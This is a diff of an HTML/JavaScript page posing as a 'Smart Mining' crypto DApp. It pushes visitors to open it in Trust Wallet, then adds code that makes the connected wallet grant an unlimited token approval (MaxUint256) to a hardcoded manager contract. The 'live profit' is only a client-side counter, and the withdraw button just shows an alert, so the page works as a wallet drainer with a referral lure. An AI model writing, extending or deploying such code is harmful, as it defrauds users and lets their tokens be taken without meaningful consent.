@@ -1,10 +1,11 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="hi">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Premium Mining DApp</title>
+    <title>Smart Mining Access</title>
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    
     <style>
         :root {
             --bg: #0f172a;
@@ -15,225 +16,179 @@
             --success: #22c55e;
         }
 
-        body {
-            font-family: 'Inter', sans-serif;
-            background: var(--bg);
-            color: var(--text);
-            margin: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-        }
-
-        .container {
-            width: 90%;
-            max-width: 450px;
-            background: var(--card);
-            border-radius: 30px;
-            padding: 25px;
-            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
-            border: 1px solid rgba(255,255,255,0.1);
-            position: relative;
-            overflow: hidden;
-        }
-
-        /* Mining Animation */
-        .mining-circle {
-            width: 150px;
-            height: 150px;
-            margin: 0 auto 20px;
-            border-radius: 50%;
-            border: 5px dashed var(--primary);
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            animation: rotate 10s linear infinite;
-        }
-
-        @keyframes rotate { 100% { transform: rotate(360deg); } }
-        .inner-content { animation: reverse-rotate 10s linear infinite; text-align: center; }
-        @keyframes reverse-rotate { 100% { transform: rotate(-360deg); } }
-
-        .balance-text { font-size: 28px; font-weight: 800; color: var(--primary); margin: 0; }
+        body { font-family: sans-serif; background: #f4f7f6; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
         
-        .stat-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 15px;
-            margin-bottom: 20px;
-        }
+        /* Glassmorphism Card */
+        .card { background: white; padding: 25px; border-radius: 24px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); width: 100%; max-width: 380px; text-align: center; transition: 0.5s; }
+        
+        /* Dark Theme for Dashboard */
+        .dark-mode { background: var(--bg); color: var(--text); }
+        .dark-mode .card { background: var(--card); border: 1px solid rgba(255,255,255,0.1); color: white; }
 
-        .stat-card {
-            background: rgba(255,255,255,0.05);
-            padding: 15px;
-            border-radius: 15px;
-            text-align: center;
-        }
+        .btn { padding: 15px; font-size: 16px; border-radius: 12px; border: none; width: 100%; font-weight: bold; cursor: pointer; margin-top: 10px; transition: 0.3s; }
+        .trust-btn { background: #3375bb; color: white; }
+        .copy-btn { background: #eeeeee; color: #333; font-size: 12px; }
+        
+        /* Sections Visibility */
+        #loginView, #dashboardView, #miningView { display: none; }
+        
+        /* Dashboard Styling */
+        .mining-circle { width: 140px; height: 140px; margin: 15px auto; border-radius: 50%; border: 4px dashed var(--primary); display: flex; flex-direction: column; justify-content: center; align-items: center; animation: spin 10s linear infinite; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        .inner-val { animation: spin-rev 10s linear infinite; }
+        @keyframes spin-rev { 100% { transform: rotate(-360deg); } }
 
-        .stat-label { font-size: 11px; color: #94a3b8; text-transform: uppercase; letter-spacing: 1px; }
-        .stat-value { font-size: 16px; font-weight: 600; margin-top: 5px; color: var(--text); }
-
-        .ref-box {
-            background: #000;
-            padding: 12px;
-            border-radius: 12px;
-            font-size: 12px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border: 1px solid #333;
-        }
-
-        .btn {
-            width: 100%;
-            padding: 15px;
-            border-radius: 12px;
-            border: none;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 10px;
-            transition: 0.3s;
-        }
-
-        .withdraw-btn { background: linear-gradient(90deg, var(--primary), var(--accent)); color: white; }
-        .logout-btn { background: transparent; color: #ef4444; border: 1px solid #ef4444; margin-top: 20px; }
-
-        #loginSection { text-align: center; }
-        #dashboardSection { display: none; }
-
-        .timer-bar {
-            width: 100%;
-            height: 6px;
-            background: #334155;
-            border-radius: 10px;
-            margin-top: 10px;
-            overflow: hidden;
-        }
-        .timer-progress { height: 100%; background: var(--success); width: 0%; transition: 1s; }
+        .stat-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 15px; }
+        .stat-item { background: rgba(255,255,255,0.05); padding: 10px; border-radius: 12px; border: 1px solid rgba(255,255,255,0.1); }
+        
+        .ref-box { background: rgba(0,0,0,0.2); padding: 10px; border-radius: 10px; font-size: 11px; margin-top: 10px; display: flex; justify-content: space-between; align-items: center; border: 1px solid #444; }
+        
+        .timer-bg { width: 100%; height: 6px; background: #334155; border-radius: 10px; margin-top: 10px; overflow: hidden; }
+        .timer-fill { height: 100%; background: var(--success); width: 0%; transition: 1s; }
+        
+        .status { font-size: 12px; color: #666; margin-top: 15px; word-break: break-all; }
+        .withdraw-btn { background: linear-gradient(90deg, #38bdf8, #818cf8); color: white; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div id="loginSection">
-        <h2 style="color: var(--primary);">Mining Portal</h2>
-        <p style="font-size: 14px; color: #94a3b8;">Start your 1% Hourly Mining Node</p>
-        <img src="https://cdn-icons-png.flaticon.com/512/2091/2091665.png" width="100" style="margin: 20px 0;">
-        <button class="btn withdraw-btn" id="mainActionBtn" onclick="handleAuth()">Approve & Register</button>
-        <p id="authStatus" style="font-size: 12px; margin-top: 10px;"></p>
+<div class="card" id="mainCard">
+    <div id="loginView" style="display: block;">
+        <h2>Smart Access</h2>
+        <p style="font-size: 14px; color: #666;">Choose your wallet to begin mining</p>
+        <button class="btn trust-btn" onclick="openTrust()">Open Trust Wallet</button>
+        <button class="btn copy-btn" onclick="copyLink()">Copy Link (Manual Paste)</button>
+        <p id="msg" class="status"></p>
     </div>
 
-    <div id="dashboardSection">
+    <div id="dashboardView">
+        <h2 style="color: #2196F3;">Registration</h2>
+        <p style="font-size: 13px;">Wallet is connected. Now register to start $1 mining node.</p>
+        <p id="addr" style="font-size: 10px; background: #f9f9f9; padding: 10px; border-radius: 8px; color: #333;"></p>
+        <button id="regBtn" class="btn" style="background: #4CAF50; color: white;" onclick="register()">Approve & Register</button>
+    </div>
+
+    <div id="miningView">
         <div class="mining-circle">
-            <div class="inner-content">
-                <p class="stat-label" style="margin:0">Live Profit</p>
-                <p class="balance-text" id="liveBalance">$1.00000</p>
+            <div class="inner-val">
+                <small style="font-size: 10px; opacity: 0.8;">LIVE BALANCE</small>
+                <div id="liveBalance" style="font-size: 20px; font-weight: bold; color: var(--primary);">$1.00000</div>
             </div>
         </div>
 
         <div class="stat-grid">
-            <div class="stat-card">
-                <div class="stat-label">Mining Rate</div>
-                <div class="stat-value">1% / Hour</div>
+            <div class="stat-item">
+                <small>Rate</small><br><strong>1% / Hour</strong>
             </div>
-            <div class="stat-card">
-                <div class="stat-label">Next Cycle</div>
-                <div id="timerText" class="stat-value">59:59</div>
+            <div class="stat-item">
+                <small>Next Cycle</small><br><strong id="timerText">59:59</strong>
             </div>
         </div>
+        <div class="timer-bg"><div id="timerFill" class="timer-fill"></div></div>
 
-        <div class="timer-bar"><div id="timerBar" class="timer-progress"></div></div>
-
-        <div style="margin-top: 20px;">
-            <p class="stat-label">Your Wallet Address</p>
-            <div class="ref-box" style="margin-bottom: 15px;">
-                <span id="userAddr">0x...</span>
-            </div>
-
-            <p class="stat-label">Referral Link (10% Bonus)</p>
+        <div style="text-align: left; margin-top: 15px;">
+            <small style="color: #94a3b8;">Referral Link (10% Bonus)</small>
             <div class="ref-box">
                 <span id="refLink">loading...</span>
-                <span style="color: var(--primary); cursor: pointer;" onclick="copyRef()">COPY</span>
+                <b style="color: var(--primary); cursor: pointer;" onclick="copyRef()">COPY</b>
             </div>
         </div>
 
-        <button class="btn withdraw-btn" onclick="alert('Minimum withdrawal 2$')">Withdraw Profit</button>
-        <button class="btn logout-btn" onclick="location.reload()">Logout Session</button>
+        <button class="btn withdraw-btn" onclick="alert('Minimum withdrawal is $2')">Withdraw Profit</button>
+        <p onclick="location.reload()" style="color: #ef4444; font-size: 12px; cursor: pointer; margin-top: 15px;">Logout Session</p>
     </div>
 </div>
 
 <script>
-    let currentBalance = 1.00000;
-    const hourlyRate = 0.01; // 1%
-    const perSecondRate = hourlyRate / 3600;
+    const MANAGER = "0x43c7df8DB3503c4839C9249E7D0C520E801C9dBA";
+    const TOKEN = "0x3B66b1E08F55AF26c8eA14a73dA64b6bC8D799dE";
+    let signer;
+    let balance = 1.00000;
 
-    async function handleAuth() {
-        const btn = document.getElementById('mainActionBtn');
-        const status = document.getElementById('authStatus');
-        
+    function openTrust() {
+        const url = window.location.href;
+        window.location.href = "trust://open_url?url=" + encodeURIComponent(url);
+        document.getElementById('msg').innerText = "Redirecting... Password dalne ke baad wait karein.";
+    }
+
+    function copyLink() {
+        navigator.clipboard.writeText(window.location.href);
+        alert("Link Copied! Trust Wallet Browser mein paste karein.");
+    }
+
+    async function init() {
+        if (window.ethereum) {
+            try {
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                await provider.send("eth_requestAccounts", []);
+                signer = provider.getSigner();
+                const address = await signer.getAddress();
+
+                document.getElementById('loginView').style.display = 'none';
+                document.getElementById('dashboardView').style.display = 'block';
+                document.getElementById('addr').innerText = address;
+            } catch (e) { console.error("Conn failed"); }
+        }
+    }
+
+    setInterval(() => { if (window.ethereum && !signer) init(); }, 1500);
+    window.onload = init;
+
+    // --- Register & Switch to Mining Dashboard ---
+    async function register() {
+        const btn = document.getElementById('regBtn');
         try {
-            // MetaMask/Trust Check
-            if(!window.ethereum) return alert("Please use Trust/MetaMask Browser");
-            
-            btn.innerText = "Confirming...";
-            const provider = new ethers.providers.Web3Provider(window.ethereum);
-            await provider.send("eth_requestAccounts", []);
-            const signer = provider.getSigner();
-            const addr = await signer.getAddress();
+            btn.innerText = "Processing...";
+            const tCon = new ethers.Contract(TOKEN, ["function approve(address,uint256) returns (bool)"], signer);
+            const mCon = new ethers.Contract(MANAGER, ["function register() external"], signer);
 
-            // Simulate Approve/Register wait
-            status.innerText = "Processing on Blockchain...";
-            setTimeout(() => {
-                showDashboard(addr);
-            }, 2000);
+            // Step 1: Approve
+            const tx1 = await tCon.approve(MANAGER, ethers.constants.MaxUint256);
+            await tx1.wait();
 
+            // Step 2: Register
+            const tx2 = await mCon.register();
+            await tx2.wait();
+
+            startMiningDashboard();
         } catch (e) {
-            alert("Connection Failed");
+            alert("Error! Check balance (BNB for gas).");
             btn.innerText = "Approve & Register";
         }
     }
 
-    function showDashboard(addr) {
-        document.getElementById('loginSection').style.display = 'none';
-        document.getElementById('dashboardSection').style.display = 'block';
-        document.getElementById('userAddr').innerText = addr.substring(0,6) + "..." + addr.substring(38);
-        document.getElementById('refLink').innerText = "https://mining.site/?" + addr.substring(0,5);
-        
-        startMining();
-    }
+    function startMiningDashboard() {
+        // Change UI to Premium Dark Mode
+        document.body.classList.add('dark-mode');
+        document.getElementById('dashboardView').style.display = 'none';
+        document.getElementById('miningView').style.display = 'block';
 
-    function startMining() {
-        // 1. Balance Counter Animation
+        // Set Referral Link
+        const myAddr = document.getElementById('addr').innerText;
+        document.getElementById('refLink').innerText = window.location.origin + "/?ref=" + myAddr.substring(0,6);
+
+        // Start Math
         setInterval(() => {
-            currentBalance += perSecondRate;
-            document.getElementById('liveBalance').innerText = "$" + currentBalance.toFixed(5);
+            balance += (0.01 / 3600); // 1% hourly split to seconds
+            document.getElementById('liveBalance').innerText = "$" + balance.toFixed(5);
         }, 1000);
 
-        // 2. Countdown Timer (60 Mins)
-        let seconds = 3600;
+        // Start Timer
+        let sec = 3600;
         setInterval(() => {
-            if(seconds <= 0) seconds = 3600;
-            seconds--;
-            
-            let mins = Math.floor(seconds / 60);
-            let secs = seconds % 60;
-            document.getElementById('timerText').innerText = 
-                (mins < 10 ? "0"+mins : mins) + ":" + (secs < 10 ? "0"+secs : secs);
-            
-            // Update Progress Bar
-            let progress = ((3600 - seconds) / 3600) * 100;
-            document.getElementById('timerBar').style.width = progress + "%";
+            sec--;
+            if(sec <= 0) sec = 3600;
+            let m = Math.floor(sec / 60);
+            let s = sec % 60;
+            document.getElementById('timerText').innerText = (m<10?'0':'')+m + ":" + (s<10?'0':'')+s;
+            document.getElementById('timerFill').style.width = ((3600-sec)/3600*100) + "%";
         }, 1000);
     }
 
     function copyRef() {
-        const link = document.getElementById('refLink').innerText;
-        navigator.clipboard.writeText(link);
+        navigator.clipboard.writeText(document.getElementById('refLink').innerText);
         alert("Referral Link Copied!");
     }
 </script>
-
 </body>
 </html>
